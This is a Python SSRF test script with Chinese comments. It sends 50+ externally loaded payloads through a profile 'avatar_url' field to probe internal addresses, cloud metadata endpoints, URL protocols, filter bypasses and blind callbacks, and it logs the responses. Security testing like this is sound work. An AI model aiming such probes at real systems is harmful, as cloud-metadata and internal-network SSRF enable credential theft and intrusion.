"""11_ssrf — SSRF 服务端请求伪造测试（avatar_url curl 端点，50+ payload）"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lib.test_utils import *


def run():
    print_banner("11: SSRF 服务端请求伪造 (50+ payloads)")
    reset_counters()
    s = requests.Session()
    payloads = load_payloads("ssrf")

    info("登录获取会话")
    r = s.post(urljoin(BASE_URL, "/login"), data={"username": "test", "password": "test123"},
               timeout=TIMEOUT, allow_redirects=True)
    assert_status(r, 200, "登录成功")

    # ── 内网探测 ──
    info("=== 内网地址探测 ===")
    internal = [p for p in payloads if p["category"] == "internal"]
    for p in internal:
        try:
            r = s.post(urljoin(BASE_URL, "/profile"),
                       data={"email": "test@test.com", "bio": "ssrf_internal_test", "avatar_url": p["payload"]},
                       timeout=TIMEOUT, allow_redirects=False)
            ok(f"[internal] {p['name']} → HTTP {r.status_code} ({p['payload'][:40]})")
        except Exception as e:
            err(f"[internal] {p['name']} → 异常: {e}")

    # ── 云元数据 ──
    info("=== 云元数据探测 ===")
    cloud = [p for p in payloads if p["category"] == "cloud_metadata"]
    for p in cloud:
        try:
            r = s.post(urljoin(BASE_URL, "/profile"),
                       data={"email": "test@test.com", "bio": "ssrf_cloud_test", "avatar_url": p["payload"]},
                       timeout=TIMEOUT, allow_redirects=False)
            resp_line = r.text[:100] if r.text else ""
            ok(f"[cloud] {p['name']} → HTTP {r.status_code} | 响应: {resp_line[:80]}")
        except Exception as e:
            err(f"[cloud] {p['name']} → 异常: {e}")

    # ── 协议探测 ──
    info("=== 协议探测 ===")
    protocol = [p for p in payloads if p["category"] == "protocol"]
    for p in protocol:
        try:
            r = s.post(urljoin(BASE_URL, "/profile"),
                       data={"email": "test@test.com", "bio": "ssrf_proto_test", "avatar_url": p["payload"]},
                       timeout=TIMEOUT, allow_redirects=False)
            ok(f"[protocol] {p['name']} → HTTP {r.status_code}")
        except Exception as e:
            err(f"[protocol] {p['name']} → 异常: {e}")

    # ── URL 绕过 ──
    info("=== URL 绕过技术 ===")
    bypass = [p for p in payloads if p["category"] == "bypass"]
    for p in bypass:
        try:
            r = s.post(urljoin(BASE_URL, "/profile"),
                       data={"email": "test@test.com", "bio": "ssrf_bypass_test", "avatar_url": p["payload"]},
                       timeout=TIMEOUT, allow_redirects=False)
            ok(f"[bypass] {p['name']} → HTTP {r.status_code}")
        except Exception as e:
            err(f"[bypass] {p['name']} → 异常: {e}")

    # ── 盲测 callback ──
    info("=== 盲测 callback ===")
    blind = [p for p in payloads if p["category"] == "blind"]
    for p in blind:
        try:
            r = s.post(urljoin(BASE_URL, "/profile"),
                       data={"email": "test@test.com", "bio": "ssrf_blind_test", "avatar_url": p["payload"]},
                       timeout=TIMEOUT, allow_redirects=False)
            ok(f"[blind] {p['name']} → HTTP {r.status_code}")
        except Exception as e:
            err(f"[blind] {p['name']} → 异常: {e}")

    print_summary()
    save_results("11_ssrf")
    return STATE["fail"]


if __name__ == "__main__":
    sys.exit(run())
